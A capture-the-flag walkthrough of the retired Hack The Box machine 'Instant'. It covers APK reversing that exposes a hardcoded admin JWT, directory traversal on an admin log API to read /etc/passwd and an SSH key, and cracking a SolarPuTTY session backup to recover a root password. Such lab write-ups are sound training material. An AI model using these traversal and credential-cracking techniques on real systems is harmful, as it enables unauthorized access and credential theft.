---
title: HTB: Instant
url: https://0xdf.gitlab.io/2025/03/01/htb-instant.html
date: 2025-03-01T14:45:00+00:00
difficulty: Medium [30]
os: Linux
tags: ctf, htb-instant, hackthebox, nmap, apk, android, feroxbuster, appetize, android-emulation, jadx-gui, subdomain, jwt, jwt-io, flask, swagger, directory-traversal, file-read, solar-putty, sqlite, werkzeug-hash, hashcat, solarputtycracker, solarputtydecrypt
---

![Instant](/img/instant-cover.png)

Instant starts with an Android application. In reversing it, I’ll find a domain for the API swagger documentation, as well as a hard-coded admin JWT token. I’ll use that token to access the admin API, where I’ll find a file read vulnerability that I’ll leverage to get a shell. To escalate, I’ll find a SolarPuTTY session file and decrypt it to get the root password.

## Box Info

| Name | [Instant](https://hackthebox.com/machines/instant)  [Instant](https://hackthebox.com/machines/instant) [Play on HackTheBox](https://hackthebox.com/machines/instant) |
| --- | --- |
| Release Date | [12 Oct 2024](https://twitter.com/hackthebox_eu/status/1844407558091530251) |
| Retire Date | 01 Mar 2025 |
| OS | Linux Linux |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for Instant |
| Radar Graph | Radar chart for Instant |
| First Blood User | 00:14:06[DrexxKrag DrexxKrag](https://app.hackthebox.com/users/87851) |
| First Blood Root | 00:44:11[Embargo Embargo](https://app.hackthebox.com/users/267436) |
| Creator | [tahaafarooq tahaafarooq](https://app.hackthebox.com/users/573430) |

## Recon

### nmap

`nmap` finds two open TCP ports, SSH (22) and HTTP (80):

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.37
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-21 14:10 EST
Nmap scan report for 10.10.11.37
Host is up (0.087s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 6.85 seconds
oxdf@hacky$ nmap -p 22,80 -sCV 10.10.11.37
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-21 14:11 EST
Nmap scan report for 10.10.11.37
Host is up (0.086s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 31:83:eb:9f:15:f8:40:a5:04:9c:cb:3f:f6:ec:49:76 (ECDSA)
|_  256 6f:66:03:47:0e:8a:e0:03:97:67:5b:41:cf:e2:c7:c7 (ED25519)
80/tcp open  http    Apache httpd 2.4.58
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Did not follow redirect to http://instant.htb/
Service Info: Host: instant.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.57 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) and [Apache](https://packages.ubuntu.com/search?keywords=apache2) versions, the host is likely running Ubuntu 24.04 noble.

There’s a redirect on the webserver to `instant.htb`. Given the use of host-based routing, I’ll brute force for subdomains that respond differently with `ffuf`, but not find any. I’ll update my `hosts` file:

```
10.10.11.37 instant.htb

```

### instant.htb - TCP 80

#### Site

The site is for a money exchange app:

![image-20250221141903504](/img/image-20250221141903504.png)
[![expand](/icons/expand.png)](javascript:void(0) "Click to expand for full content")

The contact link points to `support@instant.htb`. All of the other links on the page stay on the page except a couple that download `instant.apk`.

#### Tech Stack

The HTTP response headers show the Apache server but nothing else definitive:

```

HTTP/1.1 200 OK
Date: Fri, 21 Feb 2025 19:19:22 GMT
Server: Apache/2.4.58 (Ubuntu)
Last-Modified: Thu, 08 Aug 2024 20:19:48 GMT
ETag: "3ffb-61f31bf93d5b2-gzip"
Accept-Ranges: bytes
Vary: Accept-Encoding
Content-Length: 16379
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html

```

The main page loads as `/index.html`, suggesting this may be a static website. The 404 page is the [default Apache page](/cheatsheets/404#apache--httpd):

![image-20250221142214029](/img/image-20250221142214029.png)

#### Directory Brute Force

I’ll run `feroxbuster` against the site:

```

oxdf@hacky$ feroxbuster -u http://mywalletv1.instant.htb

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://mywalletv1.instant.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        5l       31w      207c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      287c http://mywalletv1.instant.htb/server-status
[####################] - 2m     30000/30000   0s      found:1       errors:0      
[####################] - 2m     30000/30000   313/s   http://mywalletv1.instant.htb/

```

Nothing interesting.

## APK

### Emulating

I’ll upload the app to [appetize](https://appetize.io/) and run it:

![image-20250221143055880](/img/image-20250221143055880.png)

There’s an app that requires login. Trying to log in pops an error message:

![image-20250221143142147](/img/image-20250221143142147.png)

It can’t reach `mywalletv1.instant.htb`.

Clicking on “Register Account Now” loads another form:

![image-20250221144215597](/img/image-20250221144215597.png)

The “Forgot Password” link just says to email support:

![image-20250221144242476](/img/image-20250221144242476.png)

### Strings

A quick thing to check before anything reversing is the strings binary / files. I’m going to use [jadx-gui](https://github.com/skylot/jadx) for reversing, and it has a string search feature (under “Navigation” –> “Text Search”). I’ll open the APK in jadx-gui.

One thing I’ll want to find is URLs and domains. I already saw `mywalletv1.instant.htb`, so searching for “instant.htb” is a good start. It finds nine results (making sure to check all the “Search definitions of” boxes):

![image-20250222062551833](/img/image-20250222062551833.png)

The first is the email address seen while emulating. The next six are requests made from the application. I’ll look at those in more details. The last two are “includeSubdomains”, and `swagger-ui.instant.htb` is new.

I’ll add both of the new domains to my `hosts` file:

```
10.10.11.37 instant.htb mywalletv1.instant.htb swagger-ui.instant.htb

```

### Reversing

In `jadx-gui` I’ll take a look at the “Source code” folder. There aren’t that many classes in `com\instantlabs\instant`:

![image-20250221144443857](/img/image-20250221144443857.png)

#### Login

There’s a few interesting things to learn here. First, the code to handle login is in `LoginActivity`, in the `login` function:

```

    public void login(String str, String str2) {
        JsonObject jsonObject = new JsonObject();
        jsonObject.addProperty("username", str);
        jsonObject.addProperty("password", str2);
        new OkHttpClient().newCall(new Request.Builder().url("http://mywalletv1.instant.htb/api/v1/login").post(RequestBody.create(MediaType.parse("application/json"), jsonObject.toString())).build()).enqueue(new Callback() { // from class: com.instantlabs.instant.LoginActivity.4
            static final /* synthetic */ boolean $assertionsDisabled = false;

            @Override // okhttp3.Callback
            public void onFailure(Call call, final IOException iOException) {
                LoginActivity.this.runOnUiThread(new Runnable() { // from class: com.instantlabs.instant.LoginActivity.4.1
                    @Override // java.lang.Runnable
                    public void run() {
                        Toast.makeText(LoginActivity.this, "Login Failed: " + iOException.getMessage(), 0).show();
                        System.out.println("Login Failed : " + iOException.getMessage());
                    }
                });
            }

            @Override // okhttp3.Callback
            public void onResponse(Call call, final Response response) throws IOException {
                if (response.isSuccessful()) {
                    try {
                        LoginActivity.this.storeAccessToken(JsonParser.parseString(response.body().string()).getAsJsonObject().get("Access-Token").getAsString());
                        LoginActivity.this.navigateToProfile();
                        return;
                    } catch (JsonSyntaxException unused) {
                        LoginActivity.this.runOnUiThread(new Runnable() { // from class: com.instantlabs.instant.LoginActivity.4.2
                            @Override // java.lang.Runnable
                            public void run() {
                                Toast.makeText(LoginActivity.this, "Invalid response format", 0).show();
                            }
                        });
                        return;
                    }
                }
                LoginActivity.this.runOnUiThread(new Runnable() { // from class: com.instantlabs.instant.LoginActivity.4.3
                    @Override // java.lang.Runnable
                    public void run() {
                        Toast.makeText(LoginActivity.this, "Incorrect Username/Password", 0).show();
                        System.out.println("Login Failed : " + response.message());
                    }
                });
            }
        });
    }

```

It submits a JSON body with “username” and “password” fields in a POST request to `http://mywalletv1.instant.htb/api/v1/login`.

Similarly, the `RegisterActivity` has the code to register:

```

    public void register(String str, String str2, String str3, String str4) {
        JsonObject jsonObject = new JsonObject();
        jsonObject.addProperty("username", str);
        jsonObject.addProperty(NotificationCompat.CATEGORY_EMAIL, str2);
        jsonObject.addProperty("password", str3);
        jsonObject.addProperty("pin", str4);
        new OkHttpClient().newCall(new Request.Builder().url("http://mywalletv1.instant.htb/api/v1/register").post(RequestBody.create(MediaType.parse("application/json"), jsonObject.toString())).build()).enqueue(new Callback() { // from class: com.instantlabs.instant.RegisterActivity.3
            static final /* synthetic */ boolean $assertionsDisabled = false;

            @Override // okhttp3.Callback
            public void onFailure(Call call, final IOException iOException) {
                RegisterActivity.this.runOnUiThread(new Runnable() { // from class: com.instantlabs.instant.RegisterActivity.3.1
                    @Override // java.lang.Runnable
                    public void run() {
                        Toast.makeText(RegisterActivity.this, "Register Failed: " + iOException.getMessage(), 0).show();
                        System.out.println("Registration Failed ERROR : " + iOException.getMessage());
                    }
                });
            }

            @Override // okhttp3.Callback
            public void onResponse(Call call, final Response response) throws IOException {
                if (response.isSuccessful()) {
                    try {
                        JsonParser.parseString(response.body().string()).getAsJsonObject().get("Description").getAsString();
                        Toast.makeText(RegisterActivity.this, "Your Account Has Been Registered!", 1).show();
                        RegisterActivity.this.startActivity(new Intent(RegisterActivity.this, (Class<?>) LoginActivity.class));
                        RegisterActivity.this.finish();
                        return;
                    } catch (JsonSyntaxException unused) {
                        RegisterActivity.this.runOnUiThread(new Runnable() { // from class: com.instantlabs.instant.RegisterActivity.3.2
                            @Override // java.lang.Runnable
                            public void run() {
                                Toast.makeText(RegisterActivity.this, "Something Went Wrong Couldn't Register!", 0).show();
                            }
                        });
                        return;
                    }
                }
                RegisterActivity.this.runOnUiThread(new Runnable() { // from class: com.instantlabs.instant.RegisterActivity.3.3
                    @Override // java.lang.Runnable
                    public void run() {
                        Toast.makeText(RegisterActivity.this, "Registration Failed :" + response.message(), 0).show();
                        System.out.println("Registration Failed : " + response.message());
                    }
                });
            }
        });
    }
}

```

It sends “username”, “email”, “password”, and “pin” to `/api/v1/register`.

#### Profile

`ProfileActivity` is interesting because it shows how to access logged in resources:

```

new OkHttpClient().newCall(new Request.Builder().url("http://mywalletv1.instant.htb/api/v1/view/profile").addHeader("Authorization", accessToken).build()).enqueue(new Callback() { // from class: com.instantlabs.instant.ProfileActivity.1

```

There’s a token that’s included as an `Authorization` header. It parses the response and shows data in the resulting view:

```

    JsonObject asJsonObject = JsonParser.parseString(response.body().string()).getAsJsonObject().getAsJsonObject("Profile");
    String asString = asJsonObject.get("username").getAsString();
    String asString2 = asJsonObject.get(NotificationCompat.CATEGORY_EMAIL).getAsString();
    String asString3 = asJsonObject.get("wallet_balance").getAsString();
    String asString4 = asJsonObject.get("role").getAsString();
    textView.setText("Username: " + asString);
    textView2.setText("Email: " + asString2);
    textView3.setText("Balance: " + asString3);
    textView4.setText("Role: " + asString4);

```

#### Transactions

There’s a `sendFunds` function in `TransactionActivity`:

```

    public void sendFunds(String str, String str2, String str3, String str4, String str5) {
        JsonObject jsonObject = new JsonObject();
        jsonObject.addProperty("receiver", str);
        jsonObject.addProperty("amount", str2);
        jsonObject.addProperty("note", str3);
        new OkHttpClient().newCall(new Request.Builder().url("http://mywalletv1.instant.htb/api/v1/initiate/transaction").addHeader("Authorization", str4).post(RequestBody.create(MediaType.parse("application/json"), jsonObject.toString())).build()).enqueue(new AnonymousClass2(str5, str4));
    }

```

It takes a `receiver`, `amount`, and `note`, and POSTs JSON to `/api/v1/initiate/transaction`.

#### Admin

Perhaps most interestingly is the `AdminActivities`, which has a `TestAdminAuthorization` function:

```

public class AdminActivities {
    private String TestAdminAuthorization() {
        new OkHttpClient().newCall(new Request.Builder().url("http://mywalletv1.instant.htb/api/v1/view/profile").addHeader("Authorization", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA").build()).enqueue(new Callback() { // from class: com.instantlabs.instant.AdminActivities.1
            static final /* synthetic */ boolean $assertionsDisabled = false;

            @Override // okhttp3.Callback
            public void onFailure(Call call, IOException iOException) {
                System.out.println("Error Here : " + iOException.getMessage());
            }

            @Override // okhttp3.Callback
            public void onResponse(Call call, Response response) throws IOException {
                if (response.isSuccessful()) {
                    try {
                        System.out.println(JsonParser.parseString(response.body().string()).getAsJsonObject().get("username").getAsString());
                    } catch (JsonSyntaxException e) {
                        System.out.println("Error Here : " + e.getMessage());
                    }
                }
            }
        });
        return "Done";
    }
}

```

This includes a hardcoded token that looks like a JWT. Taking a quick look in [jwt.io](https://jwt.io/) it shows that it’s valid through 3023:

![image-20250221145449579](/img/image-20250221145449579.png)

## Shell as shirohige

### mywalletv1.instant.htb

#### Tech Stack

Visiting the root page returns a different 404, the default [Flask 404 page](/cheatsheets/404#flask):

![image-20250221151802132](/img/image-20250221151802132.png)

The HTTP headers in the 404 do show additional information as well:

```

HTTP/1.1 404 NOT FOUND
Date: Fri, 21 Feb 2025 20:16:10 GMT
Server: Werkzeug/3.0.3 Python/3.12.3
Content-Type: text/html; charset=utf-8
Content-Length: 207
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive

```

The server header matches what I’d expect from Python Flask.

Running `feroxbuster` against it returns nothing, which isn’t surprising for Flask, as only the exact endpoints would return.

#### Manual API Enumeration

Trying to access the profile API without auth returns a 401:

```

oxdf@hacky$ curl http://mywalletv1.instant.htb/api/v1/view/profile
{"Description":"Unauthorized!","Status":401}

```

The hardcoded token works!

```

oxdf@hacky$ curl http://mywalletv1.instant.htb/api/v1/view/profile -H "Authorization: $ADMIN_TOKEN" -s | jq .
{
  "Profile": {
    "account_status": "active",
    "email": "admin@instant.htb",
    "invite_token": "instant_admin_inv",
    "role": "Admin",
    "username": "instantAdmin",
    "wallet_balance": "10000000",
    "wallet_id": "f0eca6e5-783a-471d-9d8f-0162cbc900db"
  },
  "Status": 200
}

```

That shows the token is still valid.

### swagger-ui.instant.htb

I’ll load the Swagger page to see the full (exposed) API:

![image-20250221151106205](/img/image-20250221151106205.png)
[![expand](/icons/expand.png)](javascript:void(0) "Click to expand for full content")

In addition to a bunch of endpoints that I found, there are `/api/v1/admin/` endpoints for `logs`.

I could go back to `curl`, but Swagger will also take the admin token and use it to query the endpoints. The `api/v1/admin/view/logs` endpoint doesn’t take any parameters, and running it returns a list of one log in the shirohige user’s home directory:

![image-20250221151405928](/img/image-20250221151405928.png)

In the `read/log` endpoint, I’ll enter `1.log`, and it returns the contents of a test log:

![image-20250221152021011](/img/image-20250221152021011.png)

### Directory Traversal / File Read

This endpoint can be abused with directory traversal and file read. For example, `../../../etc/passwd`:

![image-20250221152155078](/img/image-20250221152155078.png)

More interestingly, because this is running from a user’s home directory, I can grab `user.txt`:

![image-20250221152241788](/img/image-20250221152241788.png)

I can also grab an SSH key:

![image-20250221152307304](/img/image-20250221152307304.png)

### SSH

#### Format Key

To make this into a key, I could manually edit out all the Python string stuff, but I’ll instead use Python to my advantage. I’ll copy from the start of the array (“[”) to the end, and paste it into a Python REPL as a variable:

```

>>> x = [            
...     "-----BEGIN OPENSSH PRIVATE KEY-----\n",
...     "b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn\n",
...     "NhAAAAAwEAAQAAAYEApbntlalmnZWcTVZ0skIN2+Ppqr4xjYgIrZyZzd9YtJGuv/w3GW8B\n",
...[snip]...
...     "5VNy/4CNnMdXALx0OMVNNoY1wPTAb0x/Pgvm24KcQn/7WCms865is11BwYYPaig5F5Zo1r\n",
...     "bhd6Uh7ofGRW/5AAAAEXNoaXJvaGlnZUBpbnN0YW50AQ==\n",
...     "-----END OPENSSH PRIVATE KEY-----\n"
...   ]

```

Now I just need to join these array items and print:

```

>>> print(''.join(x))
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEApbntlalmnZWcTVZ0skIN2+Ppqr4xjYgIrZyZzd9YtJGuv/w3GW8B
...[snip]...
n90GYFZoYuRerYOQjdGOOCJ4D/SkIpv0qqPQNulejh7DuHKiohmK8S59uMPMzgzQ4BRW0G
HwDs1CAcoWDnh7yhGK6lZM3950r1A/RPwt9FcvWfEoQqwvCV37L7YJJ7rDWlTa06qHMRMP
5VNy/4CNnMdXALx0OMVNNoY1wPTAb0x/Pgvm24KcQn/7WCms865is11BwYYPaig5F5Zo1r
bhd6Uh7ofGRW/5AAAAEXNoaXJvaGlnZUBpbnN0YW50AQ==
-----END OPENSSH PRIVATE KEY-----

```

#### Connect

I’ll save the key to a file and connect:

```

oxdf@hacky$ ssh -i ~/keys/instant-shirohige shirohige@instant.htb
Welcome to Ubuntu 24.04.1 LTS (GNU/Linux 6.8.0-45-generic x86_64)
...[snip]...
shirohige@instant:~$ 

```

## Shell as root

### Enumeration

#### Home Directories

The shirohige user’s home directory has a couple folders:

```

shirohige@instant:~$ ls
logs  projects  user.txt

```

`projects` has the API Flask application in `projects/mywallet/Instant-Api/mywallet`. `logs` has just the single log file.

There are no other users with home directories in `/home`, and no other users with shells in `passwd`:

```

shirohige@instant:~$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
shirohige:x:1001:1002:White Beard:/home/shirohige:/bin/bash

```

#### Web Configuration

There are three “sites” in the `/etc/apache2/sites-enabled` folder. `000-default.conf` handles the rewrite of undefined hosts to `instant.htb` and hosts the static HTML page from `/var/www/html`:

```

<VirtualHost *:80>
        ServerName instant.htb

        RewriteEngine On
        <Directory "/var/www/html">
            AllowOverride All
            Require all granted
        </Directory>

        RewriteCond %{HTTP_HOST} !^instant\.htb$ [NC]
        RewriteRule ^(.*)$ http://instant.htb$1 [R=301,L]
        ServerAdmin support@instant.htb
        DocumentRoot /var/www/html
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

```

`instant-app.conf` proxies the API through to port 8888:

```

<VirtualHost *:80>
        ServerName mywalletv1.instant.htb
        ProxyPreserveHost On
        ProxyPass / http://localhost:8888/
        ProxyPassReverse / http://localhost:8888/
</VirtualHost>

```

`swagger-ui.conf` proxies the Swagger domain to port 8808:

```

<VirtualHost *:80>
        ServerName swagger-ui.instant.htb
        ProxyPreserveHost On
        ProxyPass / http://localhost:8808/
        ProxyPassReverse / http://localhost:8808/
</VirtualHost>

```

#### API DB

The API code is in the shirohige user’s home directory, and has a likely SQLite database in the `instance` directory:

```

shirohige@instant:~/projects/mywallet/Instant-Api/mywallet$ ls instance/
instance/instant.db

```

I’ll copy it to my host as there aren’t any tools installed on Instant to identify or interact with it:

```

oxdf@hacky$ scp -i ~/keys/instant-shirohige shirohige@instant.htb:~/projects/mywallet/Instant-Api/mywallet/instance/instant.db .
instant.db                 100%   36KB 137.8KB/s   00:00

```

It is SQLite:

```

oxdf@hacky$ file instant.db 
instant.db: SQLite 3.x database, last written using SQLite version 3046000, file counter 13, database pages 9, cookie 0x3, schema 4, UTF-8, version-valid-for 13

```

The database has three tables:

```

oxdf@hacky$ sqlite3 instant.db 
SQLite version 3.45.1 2024-01-30 16:01:20
Enter ".help" for usage hints.
sqlite> .tables
wallet_transactions  wallet_users         wallet_wallets  

```

The only interesting data is in `wallet_users`:

```

sqlite> select * from wallet_users;
id|username|email|wallet_id|password|create_date|secret_pin|role|status
1|instantAdmin|admin@instant.htb|f0eca6e5-783a-471d-9d8f-0162cbc900db|pbkdf2:sha256:600000$I5bFyb0ZzD69pNX8$e9e4ea5c280e0766612295ab9bff32e5fa1de8f6cbb6586fab7ab7bc762bd978|2024-07-23 00:20:52.529887|87348|Admin|active
2|shirohige|shirohige@instant.htb|458715c9-b15e-467b-8a3d-97bc3fcf3c11|pbkdf2:sha256:600000$YnRgjnim$c9541a8c6ad40bc064979bc446025041ffac9af2f762726971d8a28272c550ed|2024-08-08 20:57:47.909667|42845|instantian|active

```

Looking at the top of `app.py`, it imports hash related functions from `werkzerg.security`:

```

from werkzeug.security import generate_password_hash, check_password_hash

```

These are what generate and check the hash.

#### File System

The rest of the file system is rather empty, but there is an interesting file in `/opt`:

```

shirohige@instant:/$ find opt/ -type f
opt/backups/Solar-PuTTY/sessions-backup.dat

```

`file` isn’t on Instant, so I’ll copy it to my host with `scp`:

```

oxdf@hacky$ scp -i ~/keys/instant-shirohige shirohige@instant.htb:/opt/backups/Solar-PuTTY/sessions-backup.dat .
sessions-backup.dat                  100% 1100     6.1KB/s   00:00

```

It’s a text file:

```

oxdf@hacky$ file sessions-backup.dat 
sessions-backup.dat: ASCII text, with very long lines (1100), with no line terminators
oxdf@hacky$ cat sessions-backup.dat
ZJlEkpkqLgj2PlzCyLk4gtCfsGO2CMirJoxxdpclYTlEshKzJwjMCwhDGZzNRr0fNJMlLWfpbdO7l2fEbSl/OzVAmNq0YO94RBxg9p4pwb4upKiVBhRY22HIZFzy6bMUw363zx6lxM4i9kvOB0bNd/4PXn3j3wVMVzpNxuKuSJOvv0fzY/ZjendafYt1Tz1VHbH4aHc8LQvRfW6Rn+5uTQEXyp4jE+ad4DuQk2fbm9oCSIbRO3/OKHKXvpO5Gy7db1njW44Ij44xDgcIlmNNm0m4NIo1Mb/2ZBHw/MsFFoq/TGetjzBZQQ/rM7YQI81SNu9z9VVMe1k7q6rDvpz1Ia7JSe6fRsBugW9D8GomWJNnTst7WUvqwzm29dmj7JQwp+OUpoi/j/HONIn4NenBqPn8kYViYBecNk19Leyg6pUh5RwQw8Bq+6/OHfG8xzbv0NnRxtiaK10KYh++n/Y3kC3t+Im/EWF7sQe/syt6U9q2Igq0qXJBF45Ox6XDu0KmfuAXzKBspkEMHP5MyddIz2eQQxzBznsgmXT1fQQHyB7RDnGUgpfvtCZS8oyVvrrqOyzOYl8f/Ct8iGbv/WO/SOfFqSvPQGBZnqC8Id/enZ1DRp02UdefqBejLW9JvV8gTFj94MZpcCb9H+eqj1FirFyp8w03VHFbcGdP+u915CxGAowDglI0UR3aSgJ1XIz9eT1WdS6EGCovk3na0KCz8ziYMBEl+yvDyIbDvBqmga1F+c2LwnAnVHkFeXVua70A4wtk7R3jn8+7h+3Evjc1vbgmnRjIp2sVxnHfUpLSEq4oGp3QK+AgrWXzfky7CaEEEUqpRB6knL8rZCx+Bvw5uw9u81PAkaI9SlY+60mMflf2r6cGbZsfoHCeDLdBSrRdyGVvAP4oY0LAAvLIlFZEqcuiYUZAEgXgUpTi7UvMVKkHRrjfIKLw0NUQsVY4LVRaa3rOAqUDSiOYn9F+Fau2mpfa3c2BZlBqTfL9YbMQhaaWz6VfzcSEbNTiBsWTTQuWRQpcPmNnoFN2VsqZD7d4ukhtakDHGvnvgr2TpcwiaQjHSwcMUFUawf0Oo2+yV3lwsBIUWvhQw2g=

```

It looks like base64, but decoding just produces encoded or encrypted noise.

### SolarPutty Background

[SolarPuTTY](https://www.solarwinds.com/free-tools/solar-putty) is a remote session management tool from SolarWinds, a common management software found in enterprises. It’s a Windows tool for handling connections to servers and devices across an enterprise. For example, this is a screenshot from their website:

![Solar-PuTTY | SSH Client Software](/img/Screenshot_0_Solar-PuTTY-800x582.webp)

voidsec has [some research](https://voidsec.com/solarputtydecrypt/) on how to decrypt and recover plain text credentials from SolarPuTTY’s session files, which is what I have now. There’s a tool called [SolarPuttyDecrypt](https://github.com/VoidSec/SolarPuttyDecrypt) that will take the password and produce the credentials from the session file. It’s a C# project with an EXE release.

There is also a Python tool, [SolarPuttyCracker](https://github.com/ItsWatchMakerr/SolarPuttyCracker) that was published to GitHub the day after Instant released. It describes itself as:

> A blatant ripoff of Voidsec’s decrypt tool https://github.com/VoidSec/SolarPuttyDecrypt
>
> But not written in C# so it’s infinitely better
>
> You can also pass it a wordlist because that seems like an important feature you would want when decrypting something

I’ll show both ways to approach this:

```

flowchart TD;
    subgraph identifier[" "]
      direction LR
      start1[ ] --->|intended| stop1[ ]
      style start1 height:0px;
      style stop1 height:0px;
      start2[ ] --->|unintended| stop2[ ]
      style start2 height:0px;
      style stop2 height:0px;
    end
    sessions[<a href="#file-system">sessions-backup.dat</a>]-->cracker(<a href="#recover-password-direct-crack">SolarPuttyCracker</a>);
    hashes[<a href="#api-db">Wallet Hashes</a>]-->hashcat(<a href="#format-hashes">hashcat</a>);
    hashcat-->shirohige_pass[<a href="#hashcat">shirohige Password<a/>];
    sessions-->decrypt(<a href="#solarputtydecrypt">SolarPuttyDecrypt</a>);
    shirohige_pass-->decrypt;
    cracker-->root[<a href="#su">root Password</a>];
    decrypt-->root;

linkStyle default stroke-width:2px,stroke:#FFFF99,fill:none;
linkStyle 1,2,7 stroke-width:2px,stroke:#4B9CD3,fill:none;
style identifier fill:#1d1d1d,color:#FFFFFFFF;

```

### Recover Password [Direct Crack]

When first facing Instant, I used SolarPuttyCracker both because it’s Python and because it handles the wordlist. I’ll clone the repo and create a virtual environment for the Python dependencies:

```

oxdf@hacky$ git clone https://github.com/ItsWatchMakerr/SolarPuttyCracker.git
Cloning into 'SolarPuttyCracker'...
remote: Enumerating objects: 18, done.
remote: Counting objects: 100% (18/18), done.
remote: Compressing objects: 100% (12/12), done.
remote: Total 18 (delta 4), reused 10 (delta 3), pack-reused 0 (from 0)
Receiving objects: 100% (18/18), 6.97 KiB | 6.97 MiB/s, done.
Resolving deltas: 100% (4/4), done.
oxdf@hacky$ cd SolarPuttyCracker/
oxdf@hacky$ python -m venv venv
oxdf@hacky$ source venv/bin/activate
(venv) oxdf@hacky$ pip install -r requirements.txt 
Collecting pycryptodome (from -r requirements.txt (line 1))
  Downloading pycryptodome-3.21.0-cp36-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (3.4 kB)
Downloading pycryptodome-3.21.0-cp36-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (2.3 MB)
   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 2.3/2.3 MB 19.6 MB/s eta 0:00:00
Installing collected packages: pycryptodome
Successfully installed pycryptodome-3.21.0

```

Running this with `rockyou.txt` cracks the password and decrypts the file in just over two seconds:

```

(venv) oxdf@hacky$ time python /opt/SolarPuttyCracker/SolarPuttyCracker.py sessions-backup.dat -w /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
   ____       __             ___         __   __          _____                 __            
  / __/___   / /___ _ ____  / _ \ __ __ / /_ / /_ __ __  / ___/____ ___ _ ____ / /__ ___  ____
 _\ \ / _ \ / // _ `// __/ / ___// // // __// __// // / / /__ / __// _ `// __//  '_// -_)/ __/
/___/ \___//_/ \_,_//_/   /_/    \_,_/ \__/ \__/ \_, /  \___//_/   \_,_/ \__//_/\_\ \__//_/   
                                                /___/                                         
Trying to decrypt using passwords from wordlist...
Decryption successful using password: estrella
[+] DONE Decrypted file is saved in: SolarPutty_sessions_decrypted.txt

real    0m2.222s
user    0m1.412s
sys     0m0.554s

```

The resulting file has an entry for a credential called “instant-root”:

```

(venv) oxdf@hacky$ cat SolarPutty_sessions_decrypted.txt 
{
    "Sessions": [
        {
            "Id": "066894ee-635c-4578-86d0-d36d4838115b",
            "Ip": "10.10.11.37",
            "Port": 22,
            "ConnectionType": 1,
            "SessionName": "Instant",
            "Authentication": 0,
            "CredentialsID": "452ed919-530e-419b-b721-da76cbe8ed04",
            "AuthenticateScript": "00000000-0000-0000-0000-000000000000",
            "LastTimeOpen": "0001-01-01T00:00:00",
            "OpenCounter": 1,
            "SerialLine": null,
            "Speed": 0,
            "Color": "#FF176998",
            "TelnetConnectionWaitSeconds": 1,
            "LoggingEnabled": false,
            "RemoteDirectory": ""
        }
    ],
    "Credentials": [
        {
            "Id": "452ed919-530e-419b-b721-da76cbe8ed04",
            "CredentialsName": "instant-root",
            "Username": "root",
            "Password": "12**24nzC!r0c%q12",
            "PrivateKeyPath": "",
            "Passphrase": "",
            "PrivateKeyContent": null
        }
    ],
    "AuthScript": [],
    "Groups": [],
    "Tunnels": [],
    "LogsFolderDestination": "C:\\ProgramData\\SolarWinds\\Logs\\Solar-PuTTY\\SessionLogs"
}

```

### Recover Password [Via DB]

#### Format Hashes

Given that SolarPuttyCracker didn’t exist when Instant released, I’ll also show the intended path to solve the box.

I’ve got two hashes from the database that are generated by Werkzeug. `hashcat` doesn’t currently have a mode to crack this format, but there’s a [feature request](https://github.com/hashcat/hashcat/issues/3205) from 2022 asking for it. It’s not actually a new hash technique, just that Werkzeug stores the rellevant data (rounds, salt, hash, etc) in a different format than `hashcat` expects. At the bottom of the issue, a user going by tititototutu posts a Python script to convert the hash to `hashcat`’s expected format. I’ll re-write this a bit to make it more user-friendly:

```

#!/usr/bin/env python3

import base64
import codecs
import re
import sys

if len(sys.argv) != 2:
    print(f'usage: {sys.argv[0]} <werkzeug hash file>')
    print('Input file has Werkzeug hashes one per line')
    sys.exit(1)

with open(sys.argv[1], 'r') as f:
    hashes = f.readlines()

for h in hashes:
